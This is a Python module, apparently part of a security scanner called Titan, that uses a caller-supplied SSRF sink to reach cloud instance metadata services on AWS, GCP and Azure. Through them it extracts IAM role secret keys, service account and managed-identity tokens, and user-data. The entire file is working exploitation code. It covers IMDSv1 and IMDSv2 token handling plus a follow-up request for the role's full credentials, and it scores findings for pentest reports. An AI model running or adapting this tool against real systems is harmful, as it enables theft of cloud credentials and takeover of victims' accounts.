"""IMDS Prober — Instance Metadata Service exploitation across cloud providers.

Probes cloud IMDS endpoints through an SSRF sink to extract:
  - IAM role credentials (AWS)
  - Service account tokens (GCP)
  - Managed identity tokens (Azure)
  - Instance metadata (all providers)
  - User-data / startup scripts (all providers)

The prober never contacts IMDS directly — all requests go through the
caller's SSRF-capable endpoint (the "sink"), so the evidence chain is:
  SSRF sink → IMDS endpoint → credential/metadata extraction.

Supports:
  - AWS IMDSv1 (GET) and IMDSv2 (PUT token + GET with header)
  - GCP metadata server (metadata.google.internal)
  - Azure instance metadata (169.254.169.254)
  - IPv6 IMDS (fd00::2 for AWS)
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Optional

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Cloud provider IMDS definitions
# ---------------------------------------------------------------------------

@dataclass
class IMDSEndpoint:
    """A single IMDS endpoint to probe."""
    url: str
    method: str = "GET"
    headers: dict[str, str] = field(default_factory=dict)
    description: str = ""
    provider: str = "aws"
    requires_token: bool = False  # True = IMDSv2, needs PUT token first
    sensitive: bool = False       # True = response may contain credentials


# AWS IMDSv1 endpoints
AWS_IMDS_V1 = [
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/",
        description="AWS IMDS root",
        provider="aws",
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        description="AWS IAM role names",
        provider="aws",
        sensitive=True,
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/instance-id",
        description="AWS instance ID",
        provider="aws",
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/instance-type",
        description="AWS instance type",
        provider="aws",
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/region",
        description="AWS region",
        provider="aws",
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/user-data/",
        description="AWS user-data (startup scripts)",
        provider="aws",
        sensitive=True,
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/hostname",
        description="AWS hostname",
        provider="aws",
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/local-ipv4",
        description="AWS private IPv4",
        provider="aws",
    ),
    # IPv6 IMDS
    IMDSEndpoint(
        url="http://[fd00::2]/latest/meta-data/",
        description="AWS IMDS (IPv6)",
        provider="aws",
    ),
]

# AWS IMDSv2 endpoints (require token)
AWS_IMDS_V2_TOKEN = IMDSEndpoint(
    url="http://169.254.169.254/latest/api/token",
    method="PUT",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    description="AWS IMDSv2 token request",
    provider="aws",
)

AWS_IMDS_V2 = [
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        description="AWS IMDSv2 IAM role names",
        provider="aws",
        requires_token=True,
        sensitive=True,
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/latest/meta-data/instance-id",
        description="AWS IMDSv2 instance ID",
        provider="aws",
        requires_token=True,
    ),
]

# GCP metadata endpoints
GCP_IMDS = [
    IMDSEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        description="GCP full metadata (recursive)",
        headers={"Metadata-Flavor": "Google"},
        provider="gcp",
    ),
    IMDSEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/project/project-id",
        description="GCP project ID",
        headers={"Metadata-Flavor": "Google"},
        provider="gcp",
    ),
    IMDSEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        description="GCP service account token",
        headers={"Metadata-Flavor": "Google"},
        provider="gcp",
        sensitive=True,
    ),
    IMDSEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
        description="GCP service account email",
        headers={"Metadata-Flavor": "Google"},
        provider="gcp",
    ),
    IMDSEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        description="GCP instance hostname",
        headers={"Metadata-Flavor": "Google"},
        provider="gcp",
    ),
    IMDSEndpoint(
        url="http://metadata.google.internal/computeMetadata/v1/instance/zone",
        description="GCP zone",
        headers={"Metadata-Flavor": "Google"},
        provider="gcp",
    ),
]

# Azure metadata endpoints
AZURE_IMDS = [
    IMDSEndpoint(
        url="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        description="Azure full instance metadata",
        headers={"Metadata": "true"},
        provider="azure",
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        description="Azure managed identity token",
        headers={"Metadata": "true"},
        provider="azure",
        sensitive=True,
    ),
    IMDSEndpoint(
        url="http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
        description="Azure compute metadata",
        headers={"Metadata": "true"},
        provider="azure",
    ),
]

# All IMDS endpoints by provider
ALL_IMDS = {
    "aws": AWS_IMDS_V1,
    "gcp": GCP_IMDS,
    "azure": AZURE_IMDS,
}


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class IMDSProbeResult:
    """Result of probing a single IMDS endpoint."""
    endpoint: IMDSEndpoint
    success: bool
    status: int = 0
    body: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    elapsed: float = 0.0
    error: str | None = None
    credentials: dict | None = None  # Extracted creds if sensitive endpoint


@dataclass
class IMDSReport:
    """Full IMDS probing report."""
    provider: str | None = None
    accessible: bool = False
    imdsv2_supported: bool = False
    role_name: str | None = None
    credentials: dict | None = None
    instance_id: str | None = None
    instance_type: str | None = None
    region: str | None = None
    user_data: str | None = None
    service_account_email: str | None = None
    project_id: str | None = None
    findings: list[dict] = field(default_factory=list)
    probe_results: list[IMDSProbeResult] = field(default_factory=list)


# ---------------------------------------------------------------------------
# IMDS Prober
# ---------------------------------------------------------------------------

class IMDSProber:
    """Probes cloud IMDS through an SSRF sink.

    Usage:
        prober = IMDSProber()

        # Define the SSRF sink — a function that sends a request through
        # the vulnerable endpoint and returns (status, headers, body).
        async def ssrf_sink(url: str, method: str = "GET",
                            headers: dict | None = None, timeout: float = 5.0):
            # ... send request through SSRF endpoint ...
            return (status, response_headers, response_body)

        report = await prober.probe(ssrf_sink)
    """

    def __init__(
        self,
        providers: list[str] | None = None,
        timeout: float = 5.0,
        max_concurrent: int = 3,
    ):
        """
        Args:
            providers: Which cloud providers to probe (default: all).
            timeout: Per-request timeout in seconds.
            max_concurrent: Max concurrent IMDS requests.
        """
        self.providers = providers or ["aws", "gcp", "azure"]
        self.timeout = timeout
        self._semaphore = asyncio.Semaphore(max_concurrent)

    async def probe(
        self,
        sink: Callable,
        providers: list[str] | None = None,
    ) -> IMDSReport:
        """Probe IMDS through the given SSRF sink.

        Args:
            sink: Async callable(url, method, headers, timeout) -> (status, headers, body)
            providers: Override which providers to probe.

        Returns:
            IMDSReport with all findings and extracted data.
        """
        report = IMDSReport()
        providers = providers or self.providers

        for provider in providers:
            endpoints = ALL_IMDS.get(provider, [])
            if not endpoints:
                continue

            logger.info(f"Probing {provider.upper()} IMDS ({len(endpoints)} endpoints)")

            # Probe endpoints concurrently
            tasks = [
                self._probe_endpoint(sink, ep)
                for ep in endpoints
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if isinstance(result, Exception):
                    logger.debug(f"IMDS probe exception: {result}")
                    continue
                if not result or not result.success:
                    continue

                report.accessible = True
                report.provider = provider
                report.probe_results.append(result)

                # Extract data from successful responses
                self._extract_metadata(report, result)

            # If IMDSv1 worked, we're done for this provider
            # If not, try IMDSv2 (token-based)
            if not report.accessible and provider == "aws":
                v2_result = await self._probe_imdsv2(sink)
                if v2_result:
                    report.accessible = True
                    report.imdsv2_supported = True
                    report.provider = "aws"
                    report.probe_results.append(v2_result)
                    self._extract_metadata(report, v2_result)

            # If we found role credentials, probe for the role's actual creds
            if report.role_name and report.provider == "aws":
                await self._probe_role_credentials(sink, report)

        # Generate findings — extend, not overwrite (role creds may have added some)
        report.findings.extend(self._generate_findings(report))

        return report

    async def _probe_endpoint(
        self,
        sink: Callable,
        endpoint: IMDSEndpoint,
    ) -> IMDSProbeResult:
        """Probe a single IMDS endpoint through the sink."""
        async with self._semaphore:
            start = time.time()
            try:
                status, headers, body = await asyncio.wait_for(
                    sink(
                        endpoint.url,
                        method=endpoint.method,
                        headers=endpoint.headers,
                        timeout=self.timeout,
                    ),
                    timeout=self.timeout + 2,
                )
                elapsed = time.time() - start

                success = 200 <= status < 400 and len(body) > 0
                credentials = None

                if success and endpoint.sensitive:
                    credentials = self._try_extract_creds(body, endpoint.provider)

                return IMDSProbeResult(
                    endpoint=endpoint,
                    success=success,
                    status=status,
                    body=body[:10000],  # Cap body size
                    headers=headers,
                    elapsed=elapsed,
                    credentials=credentials,
                )
            except asyncio.TimeoutError:
                return IMDSProbeResult(
                    endpoint=endpoint,
                    success=False,
                    elapsed=time.time() - start,
                    error="timeout",
                )
            except Exception as e:
                return IMDSProbeResult(
                    endpoint=endpoint,
                    success=False,
                    elapsed=time.time() - start,
                    error=str(e),
                )

    async def _probe_imdsv2(self, sink: Callable) -> IMDSProbeResult | None:
        """Try IMDSv2: PUT to get token, then use token for metadata."""
        try:
            # Step 1: Get token
            status, headers, token = await asyncio.wait_for(
                sink(
                    AWS_IMDS_V2_TOKEN.url,
                    method=AWS_IMDS_V2_TOKEN.method,
                    headers=AWS_IMDS_V2_TOKEN.headers,
                    timeout=self.timeout,
                ),
                timeout=self.timeout + 2,
            )

            if status != 200 or not token:
                return None

            token = token.strip()
            logger.info("IMDSv2 token obtained")

            # Step 2: Use token to get role names
            for endpoint in AWS_IMDS_V2:
                if not endpoint.requires_token:
                    continue

                ep_headers = {**endpoint.headers, "X-aws-ec2-metadata-token": token}
                result = await self._probe_endpoint(
                    sink,
                    IMDSEndpoint(
                        url=endpoint.url,
                        method="GET",
                        headers=ep_headers,
                        description=endpoint.description,
                        provider=endpoint.provider,
                        sensitive=endpoint.sensitive,
                    )
                )
                if result and result.success:
                    return result

        except Exception as e:
            logger.debug(f"IMDSv2 probe failed: {e}")

        return None

    async def _probe_role_credentials(
        self,
        sink: Callable,
        report: IMDSReport,
    ) -> None:
        """If we found a role name, probe for its actual credentials."""
        if not report.role_name:
            return

        cred_url = (
            f"http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            f"{report.role_name}"
        )

        result = await self._probe_endpoint(
            sink,
            IMDSEndpoint(
                url=cred_url,
                description=f"AWS role credentials: {report.role_name}",
                provider="aws",
                sensitive=True,
            )
        )

        if result and result.success:
            report.probe_results.append(result)
            creds = self._try_extract_creds(result.body, "aws")
            if creds:
                report.credentials = creds
                report.findings.append({
                    "type": "cloud_credential_exposure",
                    "severity": "critical",
                    "title": f"IAM Role Credentials Extracted: {report.role_name}",
                    "evidence": f"AccessKeyId={creds.get('AccessKeyId', 'N/A')[:12]}... "
                                f"via IMDS role {report.role_name}",
                    "oracle": "imds_credential_extraction",
                    "tier": "confirmed",
                    "flow_types": ["creds", "auth_bypass"],
                    "cvss_score": 10.0,
                    "metadata": {
                        "role_name": report.role_name,
                        "provider": "aws",
                        "access_key_prefix": creds.get("AccessKeyId", "")[:8],
                        "expiration": creds.get("Expiration", ""),
                    },
                })

    def _extract_metadata(self, report: IMDSReport, result: IMDSProbeResult) -> None:
        """Extract metadata from a successful IMDS response."""
        body = result.body
        ep = result.endpoint

        try:
            if ep.provider == "aws":
                self._extract_aws_metadata(report, body, ep)
            elif ep.provider == "gcp":
                self._extract_gcp_metadata(report, body, ep)
            elif ep.provider == "azure":
                self._extract_azure_metadata(report, body, ep)
        except Exception as e:
            logger.debug(f"Metadata extraction failed: {e}")

    def _extract_aws_metadata(self, report: IMDSReport, body: str, ep: IMDSEndpoint) -> None:
        """Extract AWS-specific metadata."""
        if "security-credentials" in ep.url and ep.url.endswith("/"):
            # This is the role names endpoint — body is just the role name
            report.role_name = body.strip().rstrip("/")
        elif "instance-id" in ep.url:
            report.instance_id = body.strip()
        elif "instance-type" in ep.url:
            report.instance_type = body.strip()
        elif "region" in ep.url:
            report.region = body.strip()
        elif "user-data" in ep.url:
            report.user_data = body.strip()
        elif "security-credentials/" in ep.url and body.strip():
            # Try to parse as JSON (role details)
            try:
                data = json.loads(body)
                if "RoleName" in data:
                    report.role_name = data["RoleName"]
            except (json.JSONDecodeError, TypeError):
                pass

    def _extract_gcp_metadata(self, report: IMDSReport, body: str, ep: IMDSEndpoint) -> None:
        """Extract GCP-specific metadata."""
        try:
            data = json.loads(body)
            if "instance" in data:
                instance = data["instance"]
                report.instance_id = instance.get("id", "")
                report.instance_type = instance.get("machineType", "").split("/")[-1]
                report.region = instance.get("zone", "").split("/")[-1]
                if "serviceAccounts" in instance:
                    for sa in instance["serviceAccounts"]:
                        report.service_account_email = sa.get("email", "")
                        break
            if "project" in data:
                report.project_id = data["project"].get("projectId", "")
        except (json.JSONDecodeError, TypeError):
            # Non-JSON response — parse as text
            if "project-id" in ep.url:
                report.project_id = body.strip()
            elif "email" in ep.url:
                report.service_account_email = body.strip()

    def _extract_azure_metadata(self, report: IMDSReport, body: str, ep: IMDSEndpoint) -> None:
        """Extract Azure-specific metadata."""
        try:
            data = json.loads(body)
            if "compute" in data:
                compute = data["compute"]
                report.instance_id = compute.get("vmId", "")
                report.instance_type = compute.get("vmSize", "")
                report.region = compute.get("location", "")
        except (json.JSONDecodeError, TypeError):
            pass

    def _try_extract_creds(self, body: str, provider: str) -> dict | None:
        """Try to extract credentials from an IMDS response."""
        try:
            data = json.loads(body)
        except (json.JSONDecodeError, TypeError):
            return None

        if provider == "aws":
            # AWS role credentials: {AccessKeyId, SecretAccessKey, Token, Expiration}
            if all(k in data for k in ("AccessKeyId", "SecretAccessKey", "Token")):
                return data
        elif provider == "gcp":
            # GCP service account token: {access_token, token_type, expires_in}
            if "access_token" in data:
                return data
        elif provider == "azure":
            # Azure managed identity token: {access_token, token_type, expires_on}
            if "access_token" in data:
                return data

        return None

    def _generate_findings(self, report: IMDSReport) -> list[dict]:
        """Generate Titan findings from the IMDS report."""
        findings = []

        if not report.accessible:
            return findings

        # IMDS accessible — always a critical finding
        findings.append({
            "type": "cloud_imds_exposure",
            "severity": "critical",
            "title": f"{report.provider.upper()} Instance Metadata Service Accessible",
            "evidence": f"IMDS endpoint responded through SSRF sink — "
                        f"provider={report.provider}, "
                        f"instance={report.instance_id or 'unknown'}",
            "oracle": "imds_endpoint_response",
            "tier": "confirmed",
            "flow_types": ["url_fetch", "creds"],
            "cvss_score": 9.8,
            "metadata": {
                "provider": report.provider,
                "instance_id": report.instance_id,
                "instance_type": report.instance_type,
                "region": report.region,
                "imdsv2": report.imdsv2_supported,
            },
        })

        # User-data exposure
        if report.user_data:
            findings.append({
                "type": "cloud_userdata_exposure",
                "severity": "critical",
                "title": "EC2 User-Data Exposed",
                "evidence": f"User-data accessible ({len(report.user_data)} chars) — "
                            f"may contain secrets, boot scripts, API keys",
                "oracle": "imds_userdata_response",
                "tier": "confirmed",
                "flow_types": ["data_leak", "creds"],
                "cvss_score": 9.1,
            })

        # GCP service account
        if report.service_account_email:
            findings.append({
                "type": "cloud_service_account_exposure",
                "severity": "high",
                "title": f"GCP Service Account Email Exposed: {report.service_account_email}",
                "evidence": f"Service account {report.service_account_email} accessible via IMDS",
                "oracle": "imds_service_account",
                "tier": "confirmed",
                "flow_types": ["data_leak"],
                "cvss_score": 7.5,
            })

        # IMDSv2 not enforced (AWS specific)
        if report.provider == "aws" and not report.imdsv2_supported:
            findings.append({
                "type": "cloud_imdsv1_enabled",
                "severity": "high",
                "title": "AWS IMDSv1 Enabled (Token-Based Protection Not Enforced)",
                "evidence": "IMDSv1 (GET-based) metadata access succeeded — "
                            "IMDSv2 (PUT-based token) not required. "
                            "IMDSv1 is vulnerable to SSRF-based credential theft.",
                "oracle": "imdsv1_accessible",
                "tier": "confirmed",
                "flow_types": ["url_fetch", "creds"],
                "cvss_score": 8.5,
            })

        return findings
